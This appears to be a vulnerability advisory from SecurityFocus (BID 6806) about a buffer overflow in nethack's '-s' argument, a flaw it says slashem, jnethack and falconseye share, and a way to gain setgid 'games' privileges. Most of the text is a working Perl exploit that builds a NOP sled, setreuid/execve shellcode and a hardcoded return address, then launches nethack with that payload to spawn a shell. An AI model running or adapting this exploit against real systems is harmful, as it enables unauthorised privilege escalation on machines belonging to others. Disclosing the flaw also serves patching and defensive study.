source: http://www.securityfocus.com/bid/6806/info
 
By passing an overly large string when invoking nethack, it is possible to corrupt memory.
 
By exploiting this issue it may be possible for an attacker to overwrite values in sensitive areas of memory, resulting in the execution of arbitrary attacker-supplied code. As nethack may be installed setgid 'games' on various systems this may allow an attacker to gain elevated privileges.
 
slashem, jnethack and falconseye are also prone to this vulnerability.

#!/usr/bin/perl -w
#
# tsao@efnet #!IC@efnet 2k3
# thnx to aleph1 for execve shellcode
# davidicke for setreuid() shellcode


$sc .= "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x0c\x31\xc0\xb0\x46\xcd\x80\x31\xdb";
$sc .= "\x31\xc9\xb3\x0c\xb1\x0c\x31\xc0\xb0\x46\xcd\x80\xeb\x24\x5e\x8d\x1e\x89\x5e";
$sc .= "\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12";
$sc .= "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff\x2f\x62";
$sc .=  "\x69\x6e\x2f\x73\x68\x01";

for ($i = 0; $i < (224 - (length($sc)) - 4); $i++) {
    $buf .= "\x90";
}

$buf .= $sc;
$buf .= "\xd2\xf8\xff\xbf";

exec("/usr/games/lib/nethackdir/nethack -s '$buf'");